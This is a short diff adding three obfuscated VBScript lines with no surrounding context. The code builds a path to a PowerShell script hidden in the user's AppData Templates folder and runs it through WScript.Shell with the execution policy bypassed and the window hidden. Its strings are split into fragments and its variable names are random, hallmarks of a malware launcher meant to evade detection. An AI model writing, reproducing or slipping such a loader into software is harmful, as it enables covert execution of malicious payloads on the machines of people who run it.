@@ -1,0 +1,3 @@
+Set ggghtytksdteeee = CreateObject("WS"&"cr"&"i"&"p"&"t.S"&"h"&"el"&"l")
+dgsfgpsdjfasndfa = ggghtytksdteeee.ExpandEnvironmentStrings("%APPDATA%") + "\Mic"&"ro"&"s"&"oft\Wi"&"n"&"do"&"ws\Te"&"mp"&"l"&"at"&"es\"&"T"&"e"&"mpl"&"ate"&"s.p"&"s"&"1"
+ggghtytksdteeee.Run "pow"&"ersh"&"el"&"l.ex"&"e -E"&"xecu"&"tion"&"Poli"&"cy Bypa"&"ss -Fil"&"e """ & dgsfgpsdjfasndfa & """", 0, False
